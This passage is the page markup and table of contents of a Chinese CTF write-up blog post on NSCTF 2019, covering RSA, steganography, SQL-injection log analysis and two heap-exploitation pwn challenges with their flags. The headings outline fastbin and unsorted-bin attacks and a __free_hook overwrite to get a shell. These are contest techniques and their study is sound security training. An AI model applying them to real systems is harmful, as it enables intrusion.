<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>CTF-NSCTF-2019年7月 | 咲夜南梦's 博客</title><meta name="description" content="CTF-NSCTF-2019年7月"><meta name="keywords" content="CTF"><meta name="author" content="咲夜南梦,196011564@qq.com"><meta name="copyright" content="咲夜南梦"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CTF-NSCTF-2019年7月"><meta name="twitter:description" content="CTF-NSCTF-2019年7月"><meta name="twitter:image" content="http://yoursite.com/2019/07/04/CTF-NSCTF-2019年7月/bg.png"><meta property="og:type" content="article"><meta property="og:title" content="CTF-NSCTF-2019年7月"><meta property="og:url" content="http://yoursite.com/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/"><meta property="og:site_name" content="咲夜南梦's 博客"><meta property="og:description" content="CTF-NSCTF-2019年7月"><meta property="og:image" content="http://yoursite.com/2019/07/04/CTF-NSCTF-2019年7月/bg.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/"><link rel="prev" title="CTF-赛博杯CyberCTF-19年7月" href="http://yoursite.com/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><link rel="next" title="CTF-2019国赛线下赛" href="http://yoursite.com/2019/06/28/CTF-2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="咲夜南梦's 博客" type="application/atom+xml">
</head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">咲夜南梦's 博客</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">118</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">41</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">21</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Crypto"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">Crypto</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#0x1-Rsa"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">0x1 Rsa</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#在线网站http-factordb-com-分解N"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">在线网站http:&#x2F;&#x2F;factordb.com&#x2F; 分解N</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#发现三个素数"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">发现三个素数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后查阅文档-三素数rsa算法"><span class="toc_mobile_items-number">1.4.</span> <span class="toc_mobile_items-text">然后查阅文档 三素数rsa算法</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#发现和两个素数差不多，然后上脚本，解出hex-转str"><span class="toc_mobile_items-number">1.5.</span> <span class="toc_mobile_items-text">发现和两个素数差不多，然后上脚本，解出hex 转str</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#脚本如下："><span class="toc_mobile_items-number">1.6.</span> <span class="toc_mobile_items-text">脚本如下：</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#转化为ascii即为flag"><span class="toc_mobile_items-number">1.7.</span> <span class="toc_mobile_items-text">转化为ascii即为flag</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#flag-1e257b39a25c6a7c4d66e197"><span class="toc_mobile_items-number">1.8.</span> <span class="toc_mobile_items-text">flag{1e257b39a25c6a7c4d66e197}</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Misc"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">Misc</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x1"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x1</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#题目"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">题目:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解法"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">解法:</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#将a转为1空格转为0"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">将a转为1空格转为0</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后直接转为十六进制"><span class="toc_mobile_items-number">3.4.</span> <span class="toc_mobile_items-text">然后直接转为十六进制</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA"><span class="toc_mobile_items-number">3.5.</span> <span class="toc_mobile_items-text">然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x2"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#发现ascii解密后为iampass0rd"><span class="toc_mobile_items-number">4.1.</span> <span class="toc_mobile_items-text">发现ascii解密后为iampass0rd</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后使用JPHS的seek，并输入上面的密码"><span class="toc_mobile_items-number">4.2.</span> <span class="toc_mobile_items-text">然后使用JPHS的seek，并输入上面的密码</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#输入密码后，保存文件，然后打开看到flag"><span class="toc_mobile_items-number">4.3.</span> <span class="toc_mobile_items-text">输入密码后，保存文件，然后打开看到flag</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#flag-jphid-is-good"><span class="toc_mobile_items-number">4.4.</span> <span class="toc_mobile_items-text">flag{jphid_is_good}</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x3"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x3</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Log-analysis"><span class="toc_mobile_items-number">5.1.</span> <span class="toc_mobile_items-text">Log analysis</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#将所有带-的字符的数据全部转为对应的ascii"><span class="toc_mobile_items-number">5.2.</span> <span class="toc_mobile_items-text">将所有带%的字符的数据全部转为对应的ascii</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx"><span class="toc_mobile_items-number">5.3.</span> <span class="toc_mobile_items-text">然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来"><span class="toc_mobile_items-number">5.4.</span> <span class="toc_mobile_items-text">搜索’}’的ascii即125，然后看到!&#x3D;,那么就向前搜索带!&#x3D;的字符串，并且将!&#x3D;后面的数字取出来</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><span class="toc_mobile_items-number">5.5.</span> <span class="toc_mobile_items-text">结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><span class="toc_mobile_items-number">5.6.</span> <span class="toc_mobile_items-text">然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#即可拿到flag"><span class="toc_mobile_items-number">5.7.</span> <span class="toc_mobile_items-text">即可拿到flag</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#flag-3287fe300f28e24aefa2d86883832c9f"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">flag{3287fe300f28e24aefa2d86883832c9f}</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Pwn"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">Pwn</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#0x1-1"><span class="toc_mobile_items-number">7.1.</span> <span class="toc_mobile_items-text">0x1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"><span class="toc_mobile_items-number">7.2.</span> <span class="toc_mobile_items-text">发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处"><span class="toc_mobile_items-number">7.3.</span> <span class="toc_mobile_items-text">得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#flag-play-w1th-he4p-shrink"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">flag{play_w1th_he4p_shrink}</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#0x2-1"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">0x2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc"><span class="toc_mobile_items-number">9.1.</span> <span class="toc_mobile_items-text">1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"><span class="toc_mobile_items-number">9.2.</span> <span class="toc_mobile_items-text">2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用&#x2F;bin&#x2F;sh\x00，因为实际操作中，&#x2F;sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook"><span class="toc_mobile_items-number">9.3.</span> <span class="toc_mobile_items-text">3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#flag-pl4y-with-global-buffer-0verflow"><span class="toc_mobile_items-number">10.</span> <span class="toc_mobile_items-text">flag{pl4y_with_global_buffer_0verflow}</span></a></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-Rsa"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 Rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在线网站http-factordb-com-分解N"><span class="toc-number">1.2.</span> <span class="toc-text">在线网站http:&#x2F;&#x2F;factordb.com&#x2F; 分解N</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现三个素数"><span class="toc-number">1.3.</span> <span class="toc-text">发现三个素数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后查阅文档-三素数rsa算法"><span class="toc-number">1.4.</span> <span class="toc-text">然后查阅文档 三素数rsa算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现和两个素数差不多，然后上脚本，解出hex-转str"><span class="toc-number">1.5.</span> <span class="toc-text">发现和两个素数差不多，然后上脚本，解出hex 转str</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#脚本如下："><span class="toc-number">1.6.</span> <span class="toc-text">脚本如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#转化为ascii即为flag"><span class="toc-number">1.7.</span> <span class="toc-text">转化为ascii即为flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-1e257b39a25c6a7c4d66e197"><span class="toc-number">1.8.</span> <span class="toc-text">flag{1e257b39a25c6a7c4d66e197}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1"><span class="toc-number">3.</span> <span class="toc-text">0x1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-number">3.1.</span> <span class="toc-text">题目:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法"><span class="toc-number">3.2.</span> <span class="toc-text">解法:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将a转为1空格转为0"><span class="toc-number">3.3.</span> <span class="toc-text">将a转为1空格转为0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后直接转为十六进制"><span class="toc-number">3.4.</span> <span class="toc-text">然后直接转为十六进制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA"><span class="toc-number">3.5.</span> <span class="toc-text">然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2"><span class="toc-number">4.</span> <span class="toc-text">0x2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#发现ascii解密后为iampass0rd"><span class="toc-number">4.1.</span> <span class="toc-text">发现ascii解密后为iampass0rd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后使用JPHS的seek，并输入上面的密码"><span class="toc-number">4.2.</span> <span class="toc-text">然后使用JPHS的seek，并输入上面的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入密码后，保存文件，然后打开看到flag"><span class="toc-number">4.3.</span> <span class="toc-text">输入密码后，保存文件，然后打开看到flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-jphid-is-good"><span class="toc-number">4.4.</span> <span class="toc-text">flag{jphid_is_good}</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3"><span class="toc-number">5.</span> <span class="toc-text">0x3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log-analysis"><span class="toc-number">5.1.</span> <span class="toc-text">Log analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将所有带-的字符的数据全部转为对应的ascii"><span class="toc-number">5.2.</span> <span class="toc-text">将所有带%的字符的数据全部转为对应的ascii</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx"><span class="toc-number">5.3.</span> <span class="toc-text">然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来"><span class="toc-number">5.4.</span> <span class="toc-text">搜索’}’的ascii即125，然后看到!&#x3D;,那么就向前搜索带!&#x3D;的字符串，并且将!&#x3D;后面的数字取出来</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><span class="toc-number">5.5.</span> <span class="toc-text">结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><span class="toc-number">5.6.</span> <span class="toc-text">然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#即可拿到flag"><span class="toc-number">5.7.</span> <span class="toc-text">即可拿到flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-3287fe300f28e24aefa2d86883832c9f"><span class="toc-number">6.</span> <span class="toc-text">flag{3287fe300f28e24aefa2d86883832c9f}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">7.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-1"><span class="toc-number">7.1.</span> <span class="toc-text">0x1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"><span class="toc-number">7.2.</span> <span class="toc-text">发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处"><span class="toc-number">7.3.</span> <span class="toc-text">得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-play-w1th-he4p-shrink"><span class="toc-number">8.</span> <span class="toc-text">flag{play_w1th_he4p_shrink}</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-1"><span class="toc-number">9.</span> <span class="toc-text">0x2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc"><span class="toc-number">9.1.</span> <span class="toc-text">1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 